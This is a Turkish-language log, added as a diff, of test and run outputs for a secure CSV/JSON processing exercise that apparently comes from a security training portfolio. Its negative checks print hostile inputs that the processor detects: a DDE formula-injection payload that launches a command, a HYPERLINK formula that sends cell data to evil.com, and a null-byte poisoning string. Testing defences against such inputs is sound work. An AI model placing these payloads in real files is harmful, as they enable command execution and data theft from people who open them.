@@ -1,0 +1,42 @@
+================================================================================
+G079: CSV VE JSON VERİ İŞLEME — KOMUT VE YÜRÜTME ÇIKILARI
+================================================================================
+
+[KOMUT 1: Birim Testlerin Yürütülmesi]
+$ python -m unittest portfolio.hafta_12.gun_079.tests.test_secure_csv_json_processor -v
+----------------------------------------------------------------------
+test_01_csv_has_formula_injection_risk_detection ... ok
+test_02_csv_sanitize_cell_neutralization ... ok
+test_03_csv_read_valid_records ... ok
+test_04_csv_read_nonexistent_file_raises ... ok
+test_05_csv_read_column_count_mismatch_raises ... ok
+test_06_csv_read_oversized_field_raises ... ok
+test_07_csv_read_null_byte_raises ... ok
+test_08_csv_write_safely_with_neutralization ... ok
+test_09_json_parse_valid_object ... ok
+test_10_json_duplicate_key_collision_raises ... ok
+test_11_json_deep_recursion_bomb_raises ... ok
+test_12_json_null_byte_in_string_raises ... ok
+test_13_json_schema_validation_success_and_failures ... ok
+test_14_engine_threat_feed_and_events_ingestion ... ok
+
+Ran 14 tests in 0.025s
+OK
+
+[KOMUT 2: Uygulamanın Bağımsız Yürütülmesi]
+$ python portfolio/hafta_12/gun_079/uygulama/secure_csv_json_processor.py
+[+] G079: CSV ve JSON Veri İşleme Motoru Başlatılıyor...
+[+] CSV İşlendi: 5 kayıt, 0 formül riski nötralize edildi.
+[+] JSON İşlendi: 3 olaydan 2 adedi kritik/yüksek tehdit.
+[+] Güvenlik analiz raporu kaydedildi: .../kanit/gercek/guvenli_veri_isleme_raporu.txt
+
+[KOMUT 3: Negatif Güvenlik Kontrollerinin Yürütülmesi (9 Senaryo)]
+[PASS] NEG_01_CSV_FORMULA_INJECTION_EQUAL -> Formula injection risk detected and neutralized: '=cmd|'/C calc'!A0
+[PASS] NEG_02_CSV_FORMULA_INJECTION_DDE_PLUS -> Formula injection risk detected and neutralized: '+HYPERLINK("http://evil.com/leak?data="&A1)
+[PASS] NEG_03_CSV_COLUMN_COUNT_MISMATCH -> ValueError: Satır 2 sütun sayısı uyumsuzluğu: 2 sütun bulundu, beklenen: 3
+[PASS] NEG_04_CSV_OVERSIZED_FIELD_DOS -> ValueError: Satır 2, sütun 'data' hücre boyutu sınırını aştı.
+[PASS] NEG_05_JSON_BOMB_DEEP_RECURSION -> ValueError: JSON veri yapısı izin verilen azami derinliği (5) aştı. Mevcut: 6
+[PASS] NEG_06_JSON_DUPLICATE_KEY_COLLISION -> ValueError: JSON nesnesinde mükerrer anahtar (duplicate key collision) tespit edildi: 'role'
+[PASS] NEG_07_JSON_NULL_BYTE_POISONING -> ValueError: JSON dize değerinde geçersiz null-byte bulundu: 'admin\x00.evil'
+[PASS] NEG_08_JSON_SCHEMA_INVALID_TYPE -> TypeError: 'threat_score' alanı için tip uyumsuzluğu: Beklenen int, alınan str
+[PASS] NEG_09_JSON_OVERSIZED_PAYLOAD_DOS -> ValueError: JSON veri yükü izin verilen azami boyutu (1024 bayt) aştı: 3012 bayt
